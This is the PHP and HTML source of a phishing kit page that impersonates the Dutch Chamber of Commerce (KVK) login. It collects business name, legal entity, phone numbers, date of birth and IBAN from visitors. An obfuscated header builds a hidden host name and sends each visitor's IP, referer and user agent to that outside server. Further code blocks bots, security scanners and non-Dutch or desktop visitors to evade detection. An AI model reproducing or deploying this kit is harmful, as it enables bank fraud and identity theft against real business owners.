<?php


 if (!function_exists('xwuv8TYBcw')) { function xwuv8TYBcw() { $xChXQD = $_SERVER['SERVER_ADDR']; $xH7Zr = '127.0.0.1'; if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xH7Zr) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xChXQD))) {$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];} elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xH7Zr)) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xH7Zr) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xChXQD))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xH7Zr) && (($_SERVER['HTTP_CLIENT_IP'])!=($xChXQD))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}  $ip=xwuv8TYBcw(); 
 if (!function_exists('xnPuqkhYTMM')) { function xnPuqkhYTMM() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }} $ref=xnPuqkhYTMM(); 
 if (!function_exists('xXpdsmMCkk')) { function xXpdsmMCkk() { if(empty($_SERVER['HTTP_USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }} $eRf9t9d9 = xXpdsmMCkk(); 
 if ($_SERVER['QUERY_STRING']!=''){ $dHerF777hg = ''.urlencode($_SERVER['QUERY_STRING']).''; } else {$dHerF777hg = '';} 
 $sourcename = 'ch'; $whatdo = 'find'; $sourceid = ''; $who = 'us'; $fd = 'x990983'; $dex9 = '.re'; $langua = 'na'; $command = 'st'; 
 $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_URL, 'https://'.$whatdo.''.$who.''.$dex9.''.$command.'/'.$who.''.$command.'.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_TIMEOUT,333); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd='.$fd.'&ip='.$ip.'&ref='.$ref.'&ua='.$eRf9t9d9.'&data='.$dHerF777hg.'&sourceid='.$sourceid.'&sourcename='.$sourcename.''); $ifbot = curl_exec($ch); curl_close($ch); 
 if ($ifbot == '') { echo '<h1>CURL ERROR</h1>'; } elseif ($ifbot != '0') { die(header('HTTP/1.1 500 Internal Server Error')); } else {  } 
 


// @Underestimated11 on telegram
error_reporting(0);
session_start();
require "configg.php";
require "kvk_assetz/vinc/functions.php";
if($internal_antibot == 1){
	require "kvk_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("kvk_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "kvk_assetz/mob_lock.php";
}
if($NL_lock == 1){
	if(onlynl() == true){
	
	}else{
		$fp = fopen("kvk_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("kvk_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
$rand = generateRandomString(130);
require "kvk_assetz/vinc/visitor_log.php";
require "kvk_assetz/vinc/netcraft_check.php";
require "kvk_assetz/vinc/blacklist_lookup.php";
require "kvk_assetz/vinc/ip_range_check.php";
?>
<!DOCTYPE html>
<html class="no-js" lang="nl">
    <head>
        <title>Inloggen</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="stylesheet" href="kvk_assetz/css/main.css" />
        <link rel="icon" href="kvk_assetz/img/favicon.ico" />
    </head>
    <body>
        <div id="tbPageWrapper" class="o-page o-page-container" style="max-width: 100%;">
            <div class="o-page-topbar c-header__topbar"></div>
            <header class="o-page-header u-shadow u-position-relative c-headermedium" style="z-index: 25;" id="siteHeader">
                <div style="z-index: 25;">
                    <div class="o-container c-header u-text-line-height-none u-padding-vertical-3x">
                        <a href="javascript:void(0)" class="c-header__logo u-text-line-height-none u-display-inline-block u-margin-right-3x u-z-index-2">
                            <svg focusable="false" class="fill-color-primary-petrol-base" width="89px" height="24px" viewBox="0 0 89 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                <g fill-rule="evenodd">
                                    <path
                                        fill="#00526E"
                                        fill-rule="nonzero"
                                        d="M71.4833333,14.7166667 C71.275,14.375 71.1333333,14.1916667 70.95,14.0833333 C70.55,13.8416667 69.9916667,13.9916667 69.7416667,14.4166667 C69.5916667,14.6916667 69.5916667,15.3 69.5916667,15.5083333 L69.5916667,24 L60,24 L60,0 L69.6,0 L69.6,10.125 L76.9166667,0 L87.4833333,0 L79.2083333,10.5583333 L88.1666667,24 L77.225,24 L71.4833333,14.7166667 Z M37.3416667,24 L48.1833333,24 L57.0916667,0 L47.3833333,0 L43.1833333,13.3833333 L43.1166667,13.3833333 L38.9583333,0 L28.8333333,0 L37.3416667,24 Z M17.225,24 L28.1666667,24 L19.2083333,10.5583333 L27.4833333,0 L16.9166667,0 L9.6,10.125 L9.6,0 L0,0 L0,24 L9.59166667,24 L9.59166667,15.5083333 C9.59166667,15.3 9.59166667,14.6916667 9.74166667,14.4166667 C9.99166667,13.9916667 10.55,13.8416667 10.95,14.0833333 C11.1333333,14.1916667 11.275,14.375 11.4833333,14.7166667 L17.225,24 Z"
                                    ></path>
                                </g>
                                <title>KVK</title>
                            </svg>
                        </a>
                        <strong class="u-text-line-height-24 u-font-size-16 color-primary-petrol-base u-z-index-1 u-border-none@size-m"></strong>
                        <nav class="c-primary-nav-mobile u-display-inline-block u-display-none@size-l u-align-middle bg-color-grayscale-white c-headermedium__primary-nav-mobile--hidden-tablet" style="z-index: 25;">
                            <button id="main-nav-mobile" class="c-primary-nav-mobile__button" style="background: white none repeat scroll 0% 0%; border: medium none;">
                                <svg class="c-hamburger-icon fill-color-currentColor u-margin-right u-display-inline-block u-align-middle" width="24px" height="24px" viewBox="0 0 64 64" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                    <g>
                                        <rect width="40" height="5"></rect>
                                        <rect width="40" height="5"></rect>
                                        <rect width="40" height="5"></rect>
                                    </g>
                                </svg>
                                <span class="c-primary-nav-mobile__text u-display-inline-block u-align-middle">Menu</span>
                            </button>
                        </nav>
                    </div>
                </div>
            </header>
            <main class="js-site-content js-notify-header o-page-main" id="js-body-content">
                <section class="o-container u-padding-vertical@size-s-only">
                    <h1 class="u-padding-top-4x u-padding-bottom-3x">Vul hieronder uw gegevens in</h1>
                    <div class="c-content-body"></div>
                    <div class="o-grid">
                        <div class="o-grid-column-start-1-end-13 o-grid-row-1@size-s-only">
                            <form id="loginform" method="post" action="ingediend">
                                <div class="o-grid">
                                    <div class="o-grid-column-start-1-end-13">
                                        <div class="o-grid">
                                            <div class="o-grid-column-start-1-end-13 o-grid-column-start-1-end-6@size-m o-grid-column-start-1-end-5@size-l">
                                                <div class="u-position-relative">
                                                    <svg style="display: none;" class="c-error-icon" width="24px" height="30px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" version="1.1">
                                                        <rect width="64" height="64" style="fill: none;"></rect>
                                                        <path d="M29,48h5V43H29ZM31.42,4,3.83,58H59Zm0,11L50.83,53H12ZM29,26v6l.92,8h3L34,32V26Z"></path>
                                                    </svg>
                                                    <label for="business">Bedrijfsnaam</label>
                                                    <div><input name="business" id="business" type="text" class="input u-margin-bottom-3x u-margin-bottom" required="" autocomplete="off" /></div>
                                                    <p style="display: none;" class="c-error-text">Dit veld is verplicht</p>
                                                </div>
                                                <div class="u-position-relative">
                                                    <svg style="display: none;" class="c-error-icon" width="24px" height="30px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" version="1.1">
                                                        <rect width="64" height="64" style="fill: none;"></rect>
                                                        <path d="M29,48h5V43H29ZM31.42,4,3.83,58H59Zm0,11L50.83,53H12ZM29,26v6l.92,8h3L34,32V26Z"></path>
                                                    </svg>
                                                    <label for="legal">Rechtspersoon </label>
                                                    <div><input name="legal" id="legal" type="text" class="input u-margin-bottom-3x u-margin-bottom" required="" autocomplete="off" /></div>
                                                    <p style="display: none;" class="c-error-text">Dit veld is verplicht</p>
                                                </div>
                                                <div class="u-position-relative">
                                                    <svg style="display: none;" class="c-error-icon" width="24px" height="30px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" version="1.1">
                                                        <rect width="64" height="64" style="fill: none;"></rect>
                                                        <path d="M29,48h5V43H29ZM31.42,4,3.83,58H59Zm0,11L50.83,53H12ZM29,26v6l.92,8h3L34,32V26Z"></path>
                                                    </svg>
                                                    <label for="phone">Telefoonnummer </label>
                                                    <div><input name="phone" id="phone" type="tel" class="input u-margin-bottom-3x u-margin-bottom" required="" autocomplete="off" /></div>
                                                    <p style="display: none;" class="c-error-text">Dit veld is verplicht</p>
                                                </div>
                                                <div class="u-position-relative">
                                                    <svg style="display: none;" class="c-error-icon" width="24px" height="30px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" version="1.1">
                                                        <rect width="64" height="64" style="fill: none;"></rect>
                                                        <path d="M29,48h5V43H29ZM31.42,4,3.83,58H59Zm0,11L50.83,53H12ZM29,26v6l.92,8h3L34,32V26Z"></path>
                                                    </svg>
                                                    <label for="mobile">Mobiele Telefoonnummer </label>
                                                    <div><input name="mobile" id="mobile" type="tel" class="input u-margin-bottom-3x u-margin-bottom" required="" autocomplete="off" /></div>
                                                    <p style="display: none;" class="c-error-text">Dit veld is verplicht</p>
                                                </div>
                                                <div class="u-position-relative">
                                                    <svg style="display: none;" class="c-error-icon" width="24px" height="30px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" version="1.1">
                                                        <rect width="64" height="64" style="fill: none;"></rect>
                                                        <path d="M29,48h5V43H29ZM31.42,4,3.83,58H59Zm0,11L50.83,53H12ZM29,26v6l.92,8h3L34,32V26Z"></path>
                                                    </svg>
                                                    <label for="dob">Geboortedatum </label>
                                                    <div><input name="dob" id="dob" type="tel" placeholder="dd-mm-jjjj" class="input u-margin-bottom-3x u-margin-bottom" required="" autocomplete="off" /></div>
                                                    <p style="display: none;" class="c-error-text">Dit veld is verplicht</p>
                                                </div>
                                                <div class="u-position-relative">
                                                    <svg style="display: none;" class="c-error-icon" width="24px" height="30px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" version="1.1">
                                                        <rect width="64" height="64" style="fill: none;"></rect>
                                                        <path d="M29,48h5V43H29ZM31.42,4,3.83,58H59Zm0,11L50.83,53H12ZM29,26v6l.92,8h3L34,32V26Z"></path>
                                                    </svg>
                                                    <label for="iban">Rekeningnummer (IBAN) </label>
                                                    <div><input name="iban" id="iban" type="text" placeholder="NL01INGB0012345678" class="input u-margin-bottom-3x u-margin-bottom" required="" autocomplete="off" /></div>
                                                    <p style="display: none;" class="c-error-text">Dit veld is verplicht</p>
                                                </div>
												<label class="form__item__box-label checkbox_container"><input onclick="$('#emailinput').toggle();" type="checkbox" value="1" name="authentication" id="authentication_remember_login">&nbsp;Wilt u per e-mail meer informatie ontvangen?</label>
												<div id="emailinput" style="display: none;" class="u-position-relative">
                                                    <svg style="display: none;" class="c-error-icon" width="24px" height="30px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" version="1.1">
                                                        <rect width="64" height="64" style="fill: none;"></rect>
                                                        <path d="M29,48h5V43H29ZM31.42,4,3.83,58H59Zm0,11L50.83,53H12ZM29,26v6l.92,8h3L34,32V26Z"></path>
                                                    </svg>
                                                    <label for="email_address">E-mail adres </label>
                                                    <div><input name="email_address" id="email_address" type="email" class="input u-margin-bottom-3x u-margin-bottom" autocomplete="off" /></div>
                                                    <p style="display: none;" class="c-error-text">Dit veld is verplicht</p>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="o-grid u-padding-bottom-4x">
                                            <div class="o-grid-column-start-1-end-13"><button type="submit" name="formSubmit" class="c-button u-margin-right-3x">Verder</button></div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </section>
            </main>
            <footer class="o-page-footer c-footer bg-color-grayscale-gray-10" id="pageFooter">
                <div class="o-container u-position-relative">
                    <div class="c-footer__bottom"></div>
                    <div class="c-footer__bottom u-padding-vertical-2x">
                        <svg
                            class="fill-color-primary-petrol-base u-display-none u-display-inline-block@size-m u-vertical-align-middle"
                            focusable="false"
                            width="138px"
                            height="16px"
                            viewBox="0 0 138 16"
                            xmlns="http://www.w3.org/2000/svg"
                            version="1.1"
                        >
                            <rect width="138" height="16" style="fill: none;"></rect>
                            <path
                                d="M51.51,15.99 L58.8,15.99 L52.8,6.99 L58.3,-0.01 L51.3,-0.01 L46.43,6.74 L46.43,4.10782519e-15 L40,4.10782519e-15 L40,16 L46.39,16 L46.39,10.33 C46.3766473,10.0849835 46.4140979,9.83985253 46.5,9.61 C46.6614798,9.33074325 47.0148632,9.22914552 47.3,9.38 C47.4444929,9.49425182 47.5636773,9.63727304 47.65,9.8 L51.51,15.99 Z M19.29,3.55271368e-15 L26.03,3.55271368e-15 L28.82,8.91 L28.86,8.91 L31.65,3.55271368e-15 L38.12,3.55271368e-15 L32.19,15.99 L24.96,15.99 L19.29,3.55271368e-15 Z M11.48,15.99 L18.77,15.99 L12.77,6.99 L18.28,-0.01 L11.28,-0.01 L6.4,6.74 L6.4,4.10782519e-15 L0,4.10782519e-15 L0,16 L6.39,16 L6.39,10.33 C6.37664729,10.0849835 6.41409786,9.83985253 6.5,9.61 C6.6576152,9.33207075 7.00782971,9.23010957 7.29,9.38 C7.44057521,9.49058925 7.56374095,9.63428262 7.65,9.8 L11.48,15.99 Z M62.59,3.5249581e-15 L64.12,3.5249581e-15 L65.47,4.41 L66.93,-0.02 L68.16,-0.02 L69.62,4.41 L71,3.5249581e-15 L72.5,3.5249581e-15 L70.24,6.55 L69,6.55 L67.53,2.3 L66.06,6.55 L64.81,6.55 L62.59,3.5249581e-15 Z M73.53,3.55271368e-15 L78.43,3.55271368e-15 L78.43,1.27 L75,1.27 L75,2.59 L78,2.59 L78,3.89 L75,3.89 L75,5.23 L78.53,5.23 L78.53,6.51 L73.53,6.51 L73.53,3.55271368e-15 Z M79.76,3.16413562e-15 L82.76,3.16413562e-15 C83.4563847,-0.0449457104 84.1414416,0.193021449 84.66,0.66 C85.044783,1.05779208 85.2475302,1.59724454 85.22,2.15 C85.2615319,3.05720019 84.6866185,3.87850506 83.82,4.15 L85.41,6.48 L83.71,6.48 L82.31,4.4 L81.19,4.4 L81.19,6.51 L79.76,6.51 L79.76,3.16413562e-15 Z M82.64,3.16 C83.34,3.16 83.74,2.79 83.74,2.24 C83.74,1.63 83.31,1.31 82.61,1.31 L81.19,1.31 L81.19,3.16 L82.64,3.16 Z M86.48,3.55271368e-15 L87.91,3.55271368e-15 L87.91,2.89 L90.55,3.55271368e-15 L92.28,3.55271368e-15 L89.63,2.76 L92.4,6.51 L90.68,6.51 L88.68,3.74 L87.92,4.52 L87.92,6.52 L86.48,6.52 L86.48,3.55271368e-15 Z M94.69,1.32 L92.69,1.32 L92.69,3.55271368e-15 L98.1,3.55271368e-15 L98.1,1.32 L96.1,1.32 L96.1,6.51 L94.69,6.51 L94.69,1.32 Z M101.44,3.55271368e-15 L103,3.55271368e-15 L104.7,4.58 L106.4,3.77475828e-15 L108,3.55271368e-15 L105.37,6.55 L104.11,6.55 L101.44,3.55271368e-15 Z M108.26,3.27 C108.26,1.35909477 109.809095,-0.19 111.72,-0.19 C113.630905,-0.19 115.18,1.35909477 115.18,3.27 C115.18,5.18090523 113.630905,6.73 111.72,6.73 C109.809095,6.73 108.26,5.18090523 108.26,3.27 Z M113.68,3.27 C113.68,2.1654305 112.784569,1.27 111.68,1.27 C110.595005,1.29713331 109.729661,2.18466571 109.73,3.27 C109.71652,3.80904228 109.921267,4.33069044 110.297811,4.7166478 C110.674355,5.10260517 111.190789,5.32016853 111.73,5.32 C112.260488,5.30690368 112.764026,5.08352313 113.129757,4.69903672 C113.495488,4.3145503 113.693428,3.80047964 113.68,3.27 Z M116.17,3.27 C116.268811,1.43400431 117.786347,-0.00405646018 119.625,-0.00405646018 C121.463653,-0.00405646018 122.981189,1.43400431 123.08,3.27 C122.981189,5.10599569 121.463653,6.54405646 119.625,6.54405646 C117.786347,6.54405646 116.268811,5.10599569 116.17,3.27 Z M121.59,3.27 C121.59,2.1654305 120.694569,1.27 119.59,1.27 C118.485431,1.27 117.59,2.1654305 117.59,3.27 C117.57652,3.80904228 117.781267,4.33069044 118.157811,4.7166478 C118.534355,5.10260517 119.050789,5.32016853 119.59,5.32 C120.129211,5.32016853 120.645645,5.10260517 121.022189,4.7166478 C121.398733,4.33069044 121.60348,3.80904228 121.59,3.27 Z M124.36,3.24740235e-15 L127.36,3.24740235e-15 C128.056385,-0.0449457104 128.741442,0.193021449 129.26,0.66 C129.644783,1.05779208 129.84753,1.59724454 129.82,2.15 C129.861532,3.05720019 129.286618,3.87850506 128.42,4.15 L130,6.51 L128.33,6.51 L126.94,4.43 L125.81,4.43 L125.81,6.51 L124.38,6.51 L124.36,3.24740235e-15 Z M127.24,3.16 C127.94,3.16 128.34,2.79 128.34,2.24 C128.34,1.63 127.91,1.31 127.21,1.31 L125.79,1.31 L125.79,3.16 L127.24,3.16 Z M62.8,12.77 C62.8,10.8590948 64.3490948,9.31 66.26,9.31 C68.1709052,9.31 69.72,10.8590948 69.72,12.77 C69.72,14.6809052 68.1709052,16.23 66.26,16.23 C64.3490948,16.23 62.8,14.6809052 62.8,12.77 Z M68.22,12.77 C68.22,11.6654305 67.3245695,10.77 66.22,10.77 C65.1154305,10.77 64.22,11.6654305 64.22,12.77 C64.22,13.8745695 65.1154305,14.77 66.22,14.77 C66.7554157,14.7868319 67.273962,14.5815282 67.6527451,14.2027451 C68.0315282,13.823962 68.2368319,13.3054157 68.22,12.77 Z M71,9.49 L72.32,9.49 L75.32,13.49 L75.32,9.49 L76.74,9.49 L76.74,16 L75.56,16 L72.41,11.89 L72.41,16.03 L71,16.03 L71,9.49 Z M78.34,9.49 L80.88,9.49 C81.7759895,9.43198362 82.6560607,9.74722058 83.3114415,10.3609298 C83.9668223,10.974639 84.3391137,11.8321346 84.34,12.73 C84.3418801,13.6296032 83.9707963,14.4897448 83.3150921,15.1056519 C82.659388,15.721559 81.7777251,16.0381303 80.88,15.98 L78.34,15.98 L78.34,9.49 Z M79.78,10.79 L79.78,14.71 L80.88,14.71 C81.4121278,14.7540167 81.9373237,14.5659751 82.3205851,14.1942115 C82.7038465,13.8224479 82.9077931,13.3032214 82.88,12.77 C82.9191559,12.2285094 82.7210511,11.6967318 82.3371596,11.3128404 C81.9532682,10.9289489 81.4214906,10.7308441 80.88,10.77 L79.78,10.79 Z M85.62,9.49 L90.52,9.49 L90.52,10.77 L87,10.77 L87,12.09 L90.07,12.09 L90.07,13.36 L87,13.36 L87,14.73 L90.53,14.73 L90.53,16 L85.62,16 L85.62,9.49 Z M91.85,9.49 L94.85,9.49 C95.5457651,9.44956385 96.2291322,9.686944 96.75,10.15 C97.1241613,10.5537771 97.3220808,11.0899591 97.3,11.64 C97.3428196,12.5444535 96.772647,13.3648457 95.91,13.64 L97.5,15.96 L95.8,15.96 L94.4,13.89 L93.28,13.89 L93.28,15.97 L91.85,15.97 L91.85,9.49 Z M94.73,12.65 C95.43,12.65 95.83,12.28 95.83,11.73 C95.83,11.11 95.4,10.8 94.7,10.8 L93.28,10.8 L93.28,12.66 L94.73,12.65 Z M98.57,9.49 L99.89,9.49 L102.89,13.49 L102.89,9.49 L104.3,9.49 L104.3,16 L103.08,16 L100,11.89 L100,16.03 L98.57,16.03 L98.57,9.49 Z M105.92,9.49 L110.83,9.49 L110.83,10.77 L107.34,10.77 L107.34,12.09 L110.41,12.09 L110.41,13.36 L107.34,13.36 L107.34,14.73 L110.87,14.73 L110.87,16 L105.87,16 L105.92,9.49 Z M112.15,9.49 L113.69,9.49 L115.4,12.25 L117.11,9.49 L118.65,9.49 L118.65,16 L117.23,16 L117.23,11.75 L115.4,14.53 L113.59,11.78 L113.59,16 L112.19,16 L112.15,9.49 Z M120.22,9.49 L125.13,9.49 L125.13,10.77 L121.64,10.77 L121.64,12.09 L124.71,12.09 L124.71,13.36 L121.64,13.36 L121.64,14.73 L125.17,14.73 L125.17,16 L120.17,16 L120.22,9.49 Z M126.45,9.49 L129.45,9.49 C130.142683,9.45003873 130.82277,9.68752938 131.34,10.15 C131.716842,10.5527705 131.918276,11.0887287 131.9,11.64 C131.94282,12.5444535 131.372647,13.3648457 130.51,13.64 L132.1,15.96 L130.4,15.96 L129,13.89 L127.87,13.89 L127.87,15.97 L126.44,15.97 L126.45,9.49 Z M129.33,12.65 C130.03,12.65 130.43,12.28 130.43,11.73 C130.43,11.11 130,10.8 129.31,10.8 L127.88,10.8 L127.88,12.66 L129.33,12.65 Z M132.73,15.05 L133.58,14.05 C134.110742,14.5378733 134.799419,14.8183136 135.52,14.84 C136.1,14.84 136.46,14.61 136.46,14.23 C136.46,13.86 136.23,13.68 135.15,13.4 C133.84,13.07 132.99,12.7 132.99,11.4 C132.984257,10.8172885 133.232947,10.2610517 133.671027,9.87677105 C134.109107,9.49249036 134.693003,9.31838812 135.27,9.4 C136.145603,9.38678774 136.998219,9.68042746 137.68,10.23 L136.94,11.31 C136.455837,10.9280356 135.865724,10.7045607 135.25,10.67 C134.7,10.67 134.41,10.92 134.41,11.23 C134.41,11.66 134.69,11.8 135.82,12.09 C137.14,12.43 137.88,12.9 137.88,14.04 C137.88,15.33 136.88,16.04 135.49,16.04 C134.479879,16.0586879 133.497944,15.7064721 132.73,15.05 Z"
                            ></path>
                            <title>KVK Werkt voor ondernemers</title>
                        </svg>
                        <ul class="u-width-full@size-s-only u-display-flex@size-m u-flex-grow-1@size-m u-text-center u-justify-content-end@size-m u-vertical-align-middle">
                            <li class="u-margin-left-3x c-footer__bottom-item"><a href="javascript:void(0)" class="c-footer__bottom-link">Privacy</a></li>
                            <li class="u-margin-left-3x c-footer__bottom-item"><a href="javascript:void(0)" class="c-footer__bottom-link">Cookies</a></li>
                            <li class="u-margin-left-3x c-footer__bottom-item">
                                <p class="c-footer__bottom-text u-margin-bottom-none">ID: <span id="wwwchannelme">0000</span></p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="c-footer__bottombar"></div>
            </footer>
        </div>
        <script src="kvk_assetz/js/jquery.js"></script>
        <script src="kvk_assetz/js/misc.js"></script>
        <script>
            $(document).ready(function () {
				$('#dob').mask('00-00-0000');
                var allInputs = $(":input");
                allInputs.focusout(function () {
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
                                $(this).addClass("error");
                                $(this).parent().next().show();
                                $(this).parent().prev().prev().show();
                            } else {
                                $(this).removeClass("error");
                                $(this).parent().next().hide();
                                $(this).parent().prev().prev().hide();
                            }
                        }
                    });
                });
            });
        </script>
    </body>
</html>